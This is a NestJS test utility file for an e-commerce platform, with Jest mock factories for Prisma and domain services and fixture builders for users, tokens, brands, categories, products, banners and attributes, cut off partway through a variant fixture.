import { Test, TestingModule } from '@nestjs/testing';
import { ConfigService } from '@nestjs/config';
import { JwtService } from '@nestjs/jwt';
import { EventEmitter2 } from '@nestjs/event-emitter';
import { PrismaService } from '../../infrastructure/prisma/prisma.service';
import { RedisService } from '../../infrastructure/redis/redis.service';
import { LoggerService } from '../../infrastructure/observability/logger.service';
import { TokenDenylistService } from '../../infrastructure/security/token-denylist.service';
import { UserRole } from '../../common/types';
import { Brand } from '../../domains/brand/entities/brand.entity';
import { BrandRequest } from '../../domains/brand/entities/brand-request.entity';
import { BrandStatus } from '../../domains/brand/enums/brand-status.enum';
import { BrandScope } from '../../domains/brand/enums/brand-scope.enum';
import { BrandRequestStatus, BrandRequestType } from '../../domains/brand/enums/request-status.enum';
import { Category } from '../../domains/category/entities/category.entity';
import { CategoryAttribute } from '../../domains/category/entities/category-attribute.entity';
import { CategoryStatus } from '../../domains/category/enums/category-status.enum';
import { CategoryVisibility } from '../../domains/category/enums/category-visibility.enum';
import { AttributeType } from '../../domains/category/enums/attribute-type.enum';


/**
 * Test Database Helper
 * Provides utilities for database testing
 */
export class TestDatabaseHelper {
  static async cleanDatabase(prisma: PrismaService): Promise<void> {
    // Clean up in reverse dependency order
    await prisma.userTenant.deleteMany();
    await prisma.user.deleteMany();
    await prisma.tenant.deleteMany();
  }

  static async createTestUser(
    prisma: PrismaService,
    overrides: Partial<any> = {},
  ) {
    return prisma.user.create({
      data: {
        email: 'test@example.com',
        name: 'Test User',
        password: '$2b$12$hashedpassword',
        roles: [UserRole.BUYER],
        status: 'ACTIVE',
        isEmailVerified: false,
        ...overrides,
      },
    });
  }

  static async createTestTenant(
    prisma: PrismaService,
    overrides: Partial<any> = {},
  ) {
    return prisma.tenant.create({
      data: {
        name: 'Test Tenant',
        slug: 'test-tenant',
        type: 'MARKETPLACE',
        status: 'ACTIVE',
        ...overrides,
      },
    });
  }
}

/**
 * Mock Services Factory
 * Creates mock implementations of services for testing
 */
export class MockServicesFactory {
  static createMockPrismaService() {
    const mock = {
      user: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        deleteMany: jest.fn(),
      },
      tenant: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findMany: jest.fn(),
        deleteMany: jest.fn(),
      },
      userTenant: {
        create: jest.fn(),
        findMany: jest.fn(),
        deleteMany: jest.fn(),
      },
      brand: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        deleteMany: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
      },
      brandRequest: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        deleteMany: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
      },
      brandAuditLog: {
        create: jest.fn(),
        findMany: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
      },
      product: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
        updateMany: jest.fn(),
      },
      category: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        deleteMany: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
      },
      categoryAttribute: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        deleteMany: jest.fn(),
        count: jest.fn(),
      },
      categoryAuditLog: {
        create: jest.fn(),
        findMany: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
      },
      banner: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        count: jest.fn(),
      },
      campaign: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        count: jest.fn(),
      },
      productVariant: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        deleteMany: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
      },
      attribute: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        deleteMany: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
      },
      attributeOption: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        delete: jest.fn(),
        deleteMany: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
      },
      configuration: {
        create: jest.fn(),
        findUnique: jest.fn(),
        findFirst: jest.fn(),
        findMany: jest.fn(),
        update: jest.fn(),
        upsert: jest.fn(),
        delete: jest.fn(),
        deleteMany: jest.fn(),
        count: jest.fn(),
        groupBy: jest.fn(),
      },
      $transaction: jest.fn(),
    };
    (mock.$transaction as jest.Mock).mockImplementation((cb) => cb(mock));
    return mock;
  }

  static createMockOrderRepository() {
    return {
      findAll: jest.fn(),
      findById: jest.fn(),
      findByOrderNumber: jest.fn(),
      findByCustomer: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
      updateStatus: jest.fn(),
      updateShippingInfo: jest.fn(),
      updateDeliveryInfo: jest.fn(),
      updateItemStatus: jest.fn(),
      findExpiredOrders: jest.fn(),
      count: jest.fn(),
    };
  }

  static createMockOrderAuditService() {
    return {
      logAction: jest.fn(),
      getOrderHistory: jest.fn(),
    };
  }

  static createMockOrderOrchestrationService() {
    return {
      createOrder: jest.fn(),
    };
  }

  static createMockOrderFulfillmentService() {
    return {
      shipOrder: jest.fn(),
    };
  }

  static createMockOrderRefundService() {
    return {
      processRefund: jest.fn(),
    };
  }

  static createMockInventoryReservationService() {
    return {
      getReservation: jest.fn(),
      commitReservation: jest.fn(),
      releaseReservation: jest.fn(),
      reserveInventory: jest.fn(),
    };
  }

  static createMockCategoryRepository() {
    return {
      findAll: jest.fn(),
      findById: jest.fn(),
      findBySlug: jest.fn(),
      findByPath: jest.fn(),
      findRoots: jest.fn(),
      findChildren: jest.fn(),
      findAncestors: jest.fn(),
      findDescendants: jest.fn(),
      findSubtree: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
      softDelete: jest.fn(),
      move: jest.fn(),
      validateMove: jest.fn(),
      validateSlug: jest.fn(),
      getTreeStatistics: jest.fn(),
      getCategoryStatistics: jest.fn(),
      validateBrandInCategory: jest.fn(),
      findCategoriesAllowingBrand: jest.fn(),
      bulkUpdate: jest.fn(),
      refreshTreeStatistics: jest.fn(),
      rebuildMaterializedPaths: jest.fn(),
    };
  }

  static createMockCategoryAuditService() {
    return {
      logAction: jest.fn(),
      logBatchAction: jest.fn(),
      getCategoryAuditHistory: jest.fn(),
      getUserAuditHistory: jest.fn(),
      getBatchAuditHistory: jest.fn(),
      getAuditStatistics: jest.fn(),
      getTreeOperationHistory: jest.fn(),
      getAttributeAuditHistory: jest.fn(),
      exportAuditLog: jest.fn(),
      cleanupOldAuditLogs: jest.fn(),
    };
  }

  static createMockCategoryTreeService() {
    return {
      getCategoryTree: jest.fn(),
      validateTreeIntegrity: jest.fn(),
      calculateTreeMetrics: jest.fn(),
    };
  }

  static createMockCategoryAttributeService() {
    return {
      create: jest.fn(),
      update: jest.fn(),
      delete: jest.fn(),
      findById: jest.fn(),
      findByCategoryId: jest.fn(),
      validateAttributeValue: jest.fn(),
      getInheritedAttributes: jest.fn(),
    };
  }

  static createMockCategoryAttributeRepository() {
    return {
      findById: jest.fn(),
      findBySlug: jest.fn(),
      findByCategoryId: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
      delete: jest.fn(),
      getEffectiveAttributes: jest.fn(),
      createInheritanceRule: jest.fn(),
      updateInheritanceRule: jest.fn(),
      removeInheritanceRules: jest.fn(),
      updateInheritedAttributes: jest.fn(),
      isAttributeUsedInProducts: jest.fn(),
      getAttributesByType: jest.fn(),
      getVariantAttributes: jest.fn(),
      getFilterableAttributes: jest.fn(),
      getRequiredAttributes: jest.fn(),
      bulkCreate: jest.fn(),
      bulkUpdate: jest.fn(),
      getAttributeStatistics: jest.fn(),
    };
  }


  static createMockRedisService() {
    return {
      get: jest.fn(),
      set: jest.fn(),
      del: jest.fn(),
      exists: jest.fn(),
      expire: jest.fn(),
      keys: jest.fn(),
    };
  }

  static createMockJwtService() {
    return {
      sign: jest.fn(),
      signAsync: jest.fn(),
      verify: jest.fn(),
      verifyAsync: jest.fn(),
      decode: jest.fn(),
    };
  }

  static createMockConfigService() {
    return {
      get: jest.fn((key: string) => {
        const config = {
          JWT_SECRET: 'test-jwt-secret',
          JWT_EXPIRES_IN: '15m',
          JWT_REFRESH_SECRET: 'test-refresh-secret',
          JWT_REFRESH_EXPIRES_IN: '7d',
        };
        return config[key];
      }),
    };
  }

  static createMockLoggerService() {
    return {
      log: jest.fn(),
      error: jest.fn(),
      warn: jest.fn(),
      debug: jest.fn(),
      verbose: jest.fn(),
    };
  }

  static createMockTokenDenylistService() {
    return {
      denyToken: jest.fn(),
      isTokenDenied: jest.fn(),
      cleanupExpiredTokens: jest.fn(),
    };
  }

  static createMockEventEmitter() {
    return {
      emit: jest.fn(),
      on: jest.fn(),
      once: jest.fn(),
      removeListener: jest.fn(),
      removeAllListeners: jest.fn(),
    };
  }

  static createMockProductRepository() {
    return {
      findAll: jest.fn().mockResolvedValue({ data: [], total: 0 }),
      findById: jest.fn().mockResolvedValue(null),
      findBySlug: jest.fn().mockResolvedValue(null),
      findByIds: jest.fn().mockResolvedValue([]),
      create: jest.fn().mockImplementation((data) => Promise.resolve({ id: 'prod-456', ...data })),
      update: jest.fn().mockImplementation((id, data) => Promise.resolve({ id, ...data })),
      delete: jest.fn().mockResolvedValue(undefined),
      softDelete: jest.fn().mockResolvedValue(undefined),
      validateSlug: jest.fn().mockResolvedValue(true),
      validateName: jest.fn().mockResolvedValue(true),
      validateCategoryBrandCombination: jest.fn().mockResolvedValue(true),
      updateStatus: jest.fn().mockImplementation((id, status, updatedBy, reason) =>
        Promise.resolve({ id, status, updatedBy, reason, updatedAt: new Date() })),
      updateModerationStatus: jest.fn().mockResolvedValue(undefined),
      bulkUpdateStatus: jest.fn().mockResolvedValue(undefined),
      bulkUpdate: jest.fn().mockResolvedValue([]),
      bulkDelete: jest.fn().mockResolvedValue(undefined),
      searchByName: jest.fn().mockResolvedValue([]),
      searchByDescription: jest.fn().mockResolvedValue([]),
      fullTextSearch: jest.fn().mockResolvedValue([]),
      findByCategory: jest.fn().mockResolvedValue({ data: [], total: 0 }),
      findByCategoryTree: jest.fn().mockResolvedValue({ data: [], total: 0 }),
      updateCategory: jest.fn().mockResolvedValue(undefined),
      findByBrand: jest.fn().mockResolvedValue({ data: [], total: 0 }),
      updateBrand: jest.fn().mockResolvedValue(undefined),
      findBySeller: jest.fn().mockResolvedValue({ data: [], total: 0 }),
      getSellerStatistics: jest.fn().mockResolvedValue({
        totalProducts: 0,
        publishedProducts: 0,
        draftProducts: 0,
        pendingProducts: 0,
      }),
      findFeatured: jest.fn().mockResolvedValue({ data: [], total: 0 }),
      setFeatured: jest.fn().mockImplementation((id, isFeatured, updatedBy) =>
        Promise.resolve({ id, isFeatured, updatedBy })),
      findScheduledForPublishing: jest.fn().mockResolvedValue([]),
      publish: jest.fn().mockResolvedValue(undefined),
      unpublish: jest.fn().mockResolvedValue(undefined),
      findPendingModeration: jest.fn().mockResolvedValue({ data: [], total: 0 }),
      findByModerationStatus: jest.fn().mockResolvedValue({ data: [], total: 0 }),
      getStatistics: jest.fn().mockResolvedValue({
        totalProducts: 100,
        publishedProducts: 80,
        draftProducts: 15,
        pendingProducts: 5,
        featuredProducts: 10,
        productsWithVariants: 25,
        productsByCategory: {},
        productsByBrand: {},
        productsByStatus: {},
      }),
      getCategoryStatistics: jest.fn().mockResolvedValue({}),
      getBrandStatistics: jest.fn().mockResolvedValue({}),
      cleanupDeletedProducts: jest.fn().mockResolvedValue(undefined),
      refreshStatistics: jest.fn().mockResolvedValue(undefined),
      incrementVersion: jest.fn().mockResolvedValue(undefined),
      findByVersion: jest.fn().mockResolvedValue(null),
    };
  }

  static createMockProductAuditService() {
    return {
      logAction: jest.fn(),
      logBatchAction: jest.fn(),
      getProductAuditHistory: jest.fn(),
      getUserAuditHistory: jest.fn(),
      getBatchAuditHistory: jest.fn(),
      getAuditStatistics: jest.fn(),
      getCategoryAuditHistory: jest.fn(),
      getBrandAuditHistory: jest.fn(),
      exportAuditLog: jest.fn(),
      cleanupOldAuditLogs: jest.fn(),
    };
  }

  static createMockProductIntegrationService() {
    return {
      validateCategoryExists: jest.fn(),
      validateBrandExists: jest.fn(),
      validateCategoryBrandCombination: jest.fn(),
      validateSellerCanUseBrand: jest.fn(),
      getCategoryHierarchy: jest.fn(),
      getBrandCategories: jest.fn(),
      syncProductWithExternalSystems: jest.fn(),
      handleCategoryChange: jest.fn(),
      handleBrandChange: jest.fn(),
    };
  }

  static createMockProductAttributeValueRepository() {
    return {
      create: jest.fn(),
      upsert: jest.fn(),
      findByProductId: jest.fn(),
      findByAttributeId: jest.fn(),
      update: jest.fn(),
      delete: jest.fn(),
      deleteByProductId: jest.fn(),
      inheritFromCategory: jest.fn(),
      validateAttributeValue: jest.fn(),
      getAttributeStatistics: jest.fn(),
    };
  }

  static createMockBannerRepository() {
    return {
      findActive: jest.fn(),
      findAll: jest.fn(),
      findById: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
      delete: jest.fn(),
    };
  }

  static createMockCampaignRepository() {
    return {
      findAll: jest.fn(),
      create: jest.fn(),
      findById: jest.fn(),
    };
  }

  static createMockAttributeRepository() {
    return {
      findAll: jest.fn(),
      findById: jest.fn(),
      findBySlug: jest.fn(),
      findByIds: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
      delete: jest.fn(),
      softDelete: jest.fn(),
      validateSlug: jest.fn(),
      validateName: jest.fn(),
      updateStatus: jest.fn(),
      bulkUpdateStatus: jest.fn(),
      bulkUpdate: jest.fn(),
      bulkDelete: jest.fn(),
      searchByName: jest.fn(),
      findByGroup: jest.fn(),
      findByDataType: jest.fn(),
      findByCategoryId: jest.fn(),
      findVariantAttributesForCategory: jest.fn(),
      findFilterableAttributesForCategory: jest.fn(),
      getStatistics: jest.fn(),
      getUsageStats: jest.fn(),
      getPopularAttributes: jest.fn(),
      getUnusedAttributes: jest.fn(),
      refreshUsageStats: jest.fn(),
      cleanupDeletedAttributes: jest.fn(),
    };
  }

  static createMockVariantRepository() {
    return {
      findAll: jest.fn(),
      findById: jest.fn(),
      findBySku: jest.fn(),
      findByProduct: jest.fn(),
      findByAttributeCombination: jest.fn(),
      create: jest.fn(),
      update: jest.fn(),
      updateStatus: jest.fn(),
      softDelete: jest.fn(),
    };
  }
}

/**
 * Test Data Factory
 * Provides test data for various scenarios
 */
export class TestDataFactory {
  static createValidRegisterDto() {
    return {
      email: 'newuser@example.com',
      name: 'New User',
      password: 'SecurePassword123!',
      phone: '+1234567890',
    };
  }

  static createValidLoginDto() {
    return {
      email: 'test@example.com',
      password: 'SecurePassword123!',
    };
  }

  static createValidGoogleAuthDto() {
    return {
      googleToken: 'valid-google-token',
    };
  }

  static createTestUser(overrides: Partial<any> = {}) {
    return {
      id: 'user-123',
      email: 'test@example.com',
      name: 'Test User',
      phone: '+1234567890',
      password: '$2b$12$hashedpassword',
      roles: [UserRole.BUYER],
      status: 'ACTIVE',
      isEmailVerified: false,
      isPhoneVerified: false,
      lastLoginAt: null,
      deletedAt: undefined,
      deletedBy: null,
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    };
  }

  static createJwtPayload(overrides: Partial<any> = {}) {
    return {
      sub: 'user-123',
      email: 'test@example.com',
      roles: [UserRole.BUYER],
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + 900, // 15 minutes
      ...overrides,
    };
  }

  static createAuthTokens() {
    return {
      accessToken:
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsImVtYWlsIjoidGVzdEBleGFtcGxlLmNvbSIsInJvbGVzIjpbIkJVWUVSIl0sImlhdCI6MTY0MDk5NTIwMCwiZXhwIjoxNjQwOTk2MTAwfQ.signature',
      refreshToken:
        'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyLTEyMyIsImVtYWlsIjoidGVzdEBleGFtcGxlLmNvbSIsInJvbGVzIjpbIkJVWUVSIl0sImlhdCI6MTY0MDk5NTIwMCwiZXhwIjoxNjQxNjAwMDAwfQ.signature',
    };
  }

  static createTestBrand(overrides: Partial<Brand> = {}): Brand {
    return new Brand({
      id: 'brand-123',
      name: 'Test Brand',
      slug: 'test-brand',
      description: 'Test brand description',
      logoUrl: 'https://example.com/logo.png',
      websiteUrl: 'https://example.com',
      status: BrandStatus.ACTIVE,
      scope: BrandScope.GLOBAL,
      isVerified: true,
      sellerId: 'seller-123',
      categoryIds: ['cat-1', 'cat-2'],
      allowedCategories: ['cat-1', 'cat-2'],
      metadata: {
        foundedYear: 2020,
        headquarters: 'Test City',
        tags: ['test', 'brand'],
      },
      createdBy: 'admin-123',
      createdAt: new Date(),
      updatedAt: new Date(),
      deletedAt: undefined,
      ...overrides,
    });
  }

  static createTestBrandRequest(overrides: Partial<any> = {}): any {
    return {
      id: 'request-123',
      type: BrandRequestType.NEW_BRAND,
      status: BrandRequestStatus.PENDING,
      brandName: 'Test Brand Request',
      brandSlug: 'test-brand-request',
      description: 'Test brand request description',
      logoUrl: 'https://example.com/logo.png',
      websiteUrl: 'https://example.com',
      categoryIds: ['cat-1'],
      businessJustification: 'This brand is needed for our new product line expansion into the test market segment.',
      expectedUsage: 'Will be used for test products',
      requesterId: 'seller-123',
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    };
  }

  static createTestCategory(overrides: Partial<Category> = {}): Category {
    const id = overrides.id || 'cat-123';
    return new Category({
      id,
      name: 'Test Category',
      slug: 'test-category',
      description: 'Test description',
      parentId: undefined,
      path: id,
      pathIds: [id],
      depth: 0,
      childCount: 0,
      descendantCount: 0,
      productCount: 0,
      status: CategoryStatus.ACTIVE,
      visibility: CategoryVisibility.PUBLIC,
      seoTitle: 'Test SEO Title',
      seoDescription: 'Test SEO Description',
      seoKeywords: ['test', 'category'],
      displayOrder: 0,
      isLeaf: true,
      isFeatured: false,
      allowedBrands: [],
      restrictedBrands: [],
      requiresBrand: false,
      createdBy: 'user-123',
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    });
  }

  static createTestCategoryAttribute(
    overrides: Partial<CategoryAttribute> = {},
  ): CategoryAttribute {
    return new CategoryAttribute({
      id: 'attr-123',
      categoryId: 'cat-123',
      name: 'Test Attribute',
      slug: 'test-attribute',
      type: AttributeType.TEXT,
      isRequired: false,
      isInheritable: true,
      isOverridable: true,
      isVariant: false,
      isFilterable: true,
      isSearchable: true,
      displayOrder: 0,
      allowedValues: [],
      createdBy: 'user-123',
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    });
  }

  static createValidCreateCategoryDto(overrides: Partial<any> = {}) {
    return {
      name: 'New Category',
      slug: 'new-category',
      description: 'New category description',
      parentId: undefined,
      visibility: CategoryVisibility.PUBLIC,
      displayOrder: 1,
      isLeaf: true,
      isFeatured: false,
      ...overrides,
    };
  }

  static createValidCreateProductDto(overrides: Partial<any> = {}) {
    return {
      name: 'Test Product',
      slug: 'test-product',
      description: 'Test product description',
      shortDescription: 'Short description',
      categoryId: 'cat-123',
      brandId: 'brand-123',
      seoTitle: 'Test SEO Title',
      seoDescription: 'Test SEO Description',
      seoKeywords: ['test', 'product'],
      metaData: { key: 'value' },
      images: ['https://example.com/image1.jpg'],
      videos: ['https://example.com/video1.mp4'],
      documents: ['https://example.com/doc1.pdf'],
      tags: ['electronics', 'test'],
      displayOrder: 1,
      isFeatured: false,
      hasVariants: false,
      visibility: 'PUBLIC' as any,
      scheduledPublishAt: null,
      attributeValues: [],
      ...overrides,
    };
  }

  static createTestProduct(overrides: Partial<any> = {}) {
    return {
      id: 'prod-123',
      name: 'Test Product',
      slug: 'test-product',
      description: 'Test product description',
      shortDescription: 'Short description',
      categoryId: 'cat-123',
      brandId: 'brand-123',
      sellerId: 'user-123', // Changed to match default user ID
      status: 'PUBLISHED', // Changed to PUBLISHED for better test compatibility
      moderationStatus: 'APPROVED', // Changed to APPROVED for better test compatibility
      visibility: 'PUBLIC' as any,
      seoTitle: 'Test SEO Title',
      seoDescription: 'Test SEO Description',
      seoKeywords: ['test', 'product'],
      metaData: { key: 'value' },
      images: ['https://example.com/image1.jpg'],
      videos: ['https://example.com/video1.mp4'],
      documents: ['https://example.com/doc1.pdf'],
      tags: ['electronics', 'test'],
      displayOrder: 1,
      isFeatured: false,
      hasVariants: false,
      variantAttributes: [],
      version: 1,
      isDeleted: false,
      canBeEdited: true,
      canBeDeleted: true,
      canBePublished: true,
      publishedAt: new Date(),
      createdBy: 'user-123',
      updatedBy: 'user-123',
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    };
  }

  static createValidCreateNewProductDto(overrides: Partial<any> = {}) {
    return {
      name: 'New Test Product',
      slug: 'new-test-product',
      description: 'New test product description',
      shortDescription: 'New short description',
      categoryId: 'cat-123',
      brandId: 'brand-123',
      seoTitle: 'New SEO Title',
      seoDescription: 'New SEO Description',
      seoKeywords: ['new', 'test', 'product'],
      metaData: { source: 'test' },
      images: ['https://example.com/new-image.jpg'],
      tags: ['new', 'test'],
      displayOrder: 1,
      hasVariants: false,
      variantAttributes: [],
      visibility: 'PUBLIC' as any,
      ...overrides,
    };
  }

  static createValidUpdateProductDto(overrides: Partial<any> = {}) {
    return {
      name: 'Updated Product Name',
      description: 'Updated description',
      shortDescription: 'Updated short description',
      seoTitle: 'Updated SEO Title',
      seoDescription: 'Updated SEO Description',
      seoKeywords: ['updated', 'keywords'],
      metaData: { updated: 'metadata' },
      images: ['https://example.com/updated-image.jpg'],
      tags: ['updated', 'tags'],
      displayOrder: 2,
      ...overrides,
    };
  }

  static createValidProductStatusUpdateDto(overrides: Partial<any> = {}) {
    return {
      status: 'PUBLISHED',
      reason: 'Product is ready for publication',
      ...overrides,
    };
  }

  static createValidProductModerationDto(overrides: Partial<any> = {}) {
    return {
      moderationStatus: 'APPROVED',
      moderationNotes: 'Product meets all requirements',
      ...overrides,
    };
  }

  static createValidBulkProductUpdateDto(overrides: Partial<any> = {}) {
    return {
      productIds: ['prod-123', 'prod-456'],
      status: 'PUBLISHED',
      tags: ['bulk-updated'],
      isFeatured: true,
      reason: 'Bulk update for featured products',
      ...overrides,
    };
  }

  static createValidProductCloneDto(overrides: Partial<any> = {}) {
    return {
      name: 'Cloned Product',
      slug: 'cloned-product',
      copyMedia: true,
      copyAttributeValues: true,
      ...overrides,
    };
  }

  static createTestBanner(overrides: Partial<any> = {}) {
    return {
      id: 'banner-123',
      title: 'Test Banner',
      description: 'Test banner description',
      imageUrl: 'https://example.com/banner.jpg',
      linkUrl: 'https://example.com',
      position: 'header',
      priority: 1,
      isActive: true,
      startDate: new Date(),
      endDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 days from now
      targetRules: { audience: ['all'] },
      clickCount: 0,
      createdBy: 'admin-123',
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    };
  }

  static createTestCampaign(overrides: Partial<any> = {}) {
    return {
      id: 'campaign-123',
      name: 'Test Campaign',
      description: 'Test campaign description',
      status: 'ACTIVE',
      startDate: new Date(),
      endDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
      budget: 1000,
      spent: 0,
      targetImpressions: 10000,
      actualImpressions: 0,
      targetClicks: 1000,
      actualClicks: 0,
      targetConversions: 100,
      actualConversions: 0,
      bannerIds: ['banner-123'],
      createdBy: 'admin-123',
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    };
  }

  static createValidCreateBannerDto(overrides: Partial<any> = {}) {
    return {
      title: 'New Banner',
      description: 'New banner description',
      imageUrl: 'https://example.com/new-banner.jpg',
      linkUrl: 'https://example.com/new-link',
      position: 'header',
      isActive: true,
      displayOrder: 1,
      startDate: new Date(),
      endDate: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      targetAudience: ['buyers'],
      metadata: { source: 'test' },
      ...overrides,
    };
  }

  static createValidCreateCampaignDto(overrides: Partial<any> = {}) {
    return {
      name: 'New Campaign',
      description: 'New campaign description',
      startDate: new Date(),
      endDate: new Date(Date.now() + 14 * 24 * 60 * 60 * 1000),
      budget: 500,
      targetImpressions: 5000,
      targetClicks: 500,
      targetConversions: 50,
      bannerIds: ['banner-456'],
      ...overrides,
    };
  }

  static createTestAttribute(overrides: Partial<any> = {}) {
    // Import the Attribute class dynamically to avoid circular dependencies
    const { Attribute } = require('../../domains/attribute/entities/attribute.entity');
    const { AttributeStatus } = require('../../domains/attribute/enums/attribute-status.enum');
    const { AttributeDataType } = require('../../domains/attribute/enums/attribute-data-type.enum');
    const { AttributeVisibility } = require('../../domains/attribute/enums/attribute-visibility.enum');

    const attribute = new Attribute();
    attribute.id = 'attr-123';
    attribute.name = 'Test Attribute';
    attribute.slug = 'test-attribute';
    attribute.description = 'Test attribute description';
    attribute.dataType = AttributeDataType.STRING;
    attribute.validation = {
      minLength: 1,
      maxLength: 100,
    };
    attribute.isRequired = false;
    attribute.isVariant = true;
    attribute.isFilterable = true;
    attribute.isSearchable = false;
    attribute.isComparable = true;
    attribute.displayOrder = 1;
    attribute.groupName = 'General';
    attribute.helpText = 'Enter a value for this attribute';
    attribute.placeholder = 'Enter value...';
    attribute.visibility = AttributeVisibility.PUBLIC;
    attribute.adminOnly = false;
    attribute.isLocalizable = false;
    attribute.status = AttributeStatus.ACTIVE;
    attribute.createdBy = 'user-123';
    attribute.updatedBy = 'user-123';
    attribute.createdAt = new Date();
    attribute.updatedAt = new Date();
    attribute.deletedAt = null;

    // Apply overrides
    Object.assign(attribute, overrides);

    return attribute;
  }

  static createValidCreateAttributeDto(overrides: Partial<any> = {}) {
    // Import enums dynamically
    const { AttributeDataType } = require('../../domains/attribute/enums/attribute-data-type.enum');
    const { AttributeVisibility } = require('../../domains/attribute/enums/attribute-visibility.enum');

    return {
      name: 'New Attribute',
      slug: 'new-attribute',
      description: 'New attribute description',
      dataType: AttributeDataType.STRING,
      validation: {
        minLength: 1,
        maxLength: 100,
      },
      isRequired: false,
      isVariant: true,
      isFilterable: true,
      isSearchable: false,
      isComparable: true,
      displayOrder: 1,
      groupName: 'General',
      helpText: 'Enter a value for this attribute',
      placeholder: 'Enter value...',
      visibility: AttributeVisibility.PUBLIC,
      adminOnly: false,
      isLocalizable: false,
      options: [
        {
          value: 'option1',
          label: 'Option 1',
          description: 'First option',
          displayOrder: 1,
          isDefault: false,
        },
        {
          value: 'option2',
          label: 'Option 2',
          description: 'Second option',
          displayOrder: 2,
          isDefault: true,
        },
      ],
      localizations: [
        {
          locale: 'es',
          name: 'Nuevo Atributo',
          description: 'Descripción del nuevo atributo',
          helpText: 'Ingrese un valor para este atributo',
          placeholder: 'Ingrese valor...',
        },
      ],
      ...overrides,
    };
  }

  static createValidUpdateAttributeDto(overrides: Partial<any> = {}) {
    return {
      name: 'Updated Attribute',
      description: 'Updated attribute description',
      isRequired: true,
      isFilterable: false,
      groupName: 'Updated Group',
      helpText: 'Updated help text',
      ...overrides,
    };
  }

  static createValidAttributeStatusUpdateDto(overrides: Partial<any> = {}) {
    return {
      status: 'DEPRECATED',
      reason: 'Attribute is being deprecated',
      ...overrides,
    };
  }

  static createValidBulkAttributeUpdateDto(overrides: Partial<any> = {}) {
    return {
      attributeIds: ['attr-123', 'attr-456'],
      status: 'ARCHIVED',
      reason: 'Bulk archive operation',
      ...overrides,
    };
  }

  static createTestAttributeStatistics(overrides: Partial<any> = {}) {
    return {
      totalAttributes: 150,
      activeAttributes: 120,
      draftAttributes: 15,
      deprecatedAttributes: 10,
      archivedAttributes: 5,
      variantAttributes: 80,
      filterableAttributes: 100,
      searchableAttributes: 60,
      localizableAttributes: 25,
      attributesByType: {
        STRING: 50,
        NUMBER: 30,
        ENUM: 40,
        BOOLEAN: 20,
        DATE: 10,
      },
      attributesByGroup: {
        General: 60,
        Technical: 40,
        Marketing: 30,
        Other: 20,
      },
      lastUpdated: new Date(),
      ...overrides,
    };
  }

  static createTestAttributeUsageStats(overrides: Partial<any> = {}) {
    return {
      attributeId: 'attr-123',
      totalUsage: 250,
      productUsage: 200,
      variantUsage: 30,
      categoryUsage: 20,
      lastUsed: new Date(Date.now() - 24 * 60 * 60 * 1000), // 1 day ago
      ...overrides,
    };
  }

  static createTestVariant(overrides: Partial<any> = {}) {
    return {
      id: 'var-123',
      productId: 'prod-123',
      sku: 'SKU-001',
      variantKey: 'attr-1:val-1',
      isActive: true,
      createdAt: new Date(),
      updatedAt: new Date(),
      ...overrides,
    };
  }

  static createValidVariantDto(overrides: Partial<any> = {}) {
    return {
      productId: 'prod-123',
      sku: 'SKU-NEW',
      attributeValues: { 'attr-1': 'val-1' },
      images: [{ url: 'http://image.com/1.jpg', altText: 'Alt', sortOrder: 0 }],
